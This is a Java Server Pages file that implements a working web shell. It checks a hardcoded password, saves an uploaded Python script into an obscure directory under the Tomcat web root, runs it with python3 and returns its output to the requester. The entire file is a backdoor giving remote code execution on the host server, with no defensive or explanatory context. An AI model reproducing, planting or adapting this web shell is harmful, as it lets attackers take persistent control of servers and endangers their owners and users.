<%@ page import="java.io.*, java.util.*, javax.servlet.*, javax.servlet.http.*, javax.servlet.annotation.*" %>
<%
    // Define the hardcoded password for authentication
    final String hardcodedPassword = "TheHermitKingdom2024__";

    // Retrieve password from the request
    String password = null;
    if (request.getContentType() != null && request.getContentType().toLowerCase().contains("multipart/form-data")) {
        try {
            Part passwordPart = request.getPart("password");
            if (passwordPart != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(passwordPart.getInputStream()));
                password = reader.readLine(); // Read the password value
                reader.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
            out.print("Error retrieving password: " + e.getMessage());
            return;
        }
    }

    // Validate password
    if (password == null || !password.trim().equals(hardcodedPassword)) {
        out.print("Authentication failed: Incorrect password.");
        return;
    }

    // Define the directory to save uploaded scripts (same as virtual packages)
    String uploadDir = application.getRealPath("/") + "opt/tomcat/webapps/docs/netspi/netspi/aggregate/";
    File dir = new File(uploadDir);
    if (!dir.exists()) {
        dir.mkdir();
    }

    // Handle file upload
    String scriptFilePath = null;
    File scriptFile = null;
    if (request.getContentType() != null && request.getContentType().toLowerCase().contains("multipart/form-data")) {
        try {
            Part filePart = request.getPart("scriptFile");
            String fileName = new File(filePart.getSubmittedFileName()).getName();
            scriptFilePath = uploadDir + fileName;
            scriptFile = new File(scriptFilePath);

            // Save the uploaded file
            filePart.write(scriptFilePath);
        } catch (Exception e) {
            e.printStackTrace();
            out.print("File upload failed: " + e.getMessage());
            return;
        }
    }

    // Execute the uploaded Python script
    if (scriptFilePath != null && scriptFile.exists()) {
        try {
            // Use system-wide Python or default Python available in the PATH
            String pythonPath = "python3";
            ProcessBuilder pb = new ProcessBuilder(pythonPath, scriptFilePath);

            System.out.println("Executing command: " + pythonPath + " " + scriptFilePath);

            // Execute the script and capture output
            Process process = pb.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            while ((line = errorReader.readLine()) != null) {
                output.append("ERROR: ").append(line).append("\n");
            }

            reader.close();
            errorReader.close();

            System.out.println("Execution output: " + output.toString());
            out.print(output.toString());
        } catch (Exception e) {
            e.printStackTrace();
            out.print("Error executing script: " + e.getMessage());
        } finally {
            // Ensure the script file is deleted after execution
            if (scriptFile.exists() && !scriptFile.delete()) {
                out.print("\nWARNING: Unable to delete the script file after execution.");
            }
        }
    } else {
        out.print("No script uploaded for execution.");
    }
%>
